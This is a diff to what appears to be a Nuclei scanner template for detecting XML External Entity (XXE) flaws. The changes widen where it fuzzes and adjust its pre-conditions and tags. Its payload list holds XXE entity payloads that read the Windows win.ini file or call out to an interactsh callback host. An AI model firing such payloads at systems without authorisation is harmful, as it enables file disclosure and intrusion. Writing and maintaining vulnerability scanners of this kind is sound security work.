@@ -4,7 +4,7 @@ http:
     - '{{xxe}}'
     keys-regex:
     - (.*?)xml(.*?)
-    part: query
+    part: request
   - fuzz:
     - '{{xxe}}'
     part: query
@@ -25,6 +25,7 @@ http:
     type: word
     words:
     - http
+  matchers-condition: or
   payloads:
     xxe:
     - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
@@ -33,19 +34,19 @@ http:
     - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
       ]><x>&{{rletter}};</x>
   pre-condition:
-  - dsl:
-    - method == "GET"
+  - condition: and
+    dsl:
+    - method != "OPTIONS"
+    - '!contains(path, ".js")'
     type: dsl
   stop-at-first-match: true
 id: generic-xxe
 info:
   author: pwnhxl,AmirHossein Raeisi
-  metadata:
-    max-request: 2
   name: Generic XML External Entity - (XXE)
   reference:
   - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
   severity: medium
-  tags: dast,xxe
+  tags: fuzzing-req-query,xxe,dast,fuzzing-req-xxe,fuzzing-req-body
 variables:
   rletter: '{{rand_base(6,''abc'')}}'
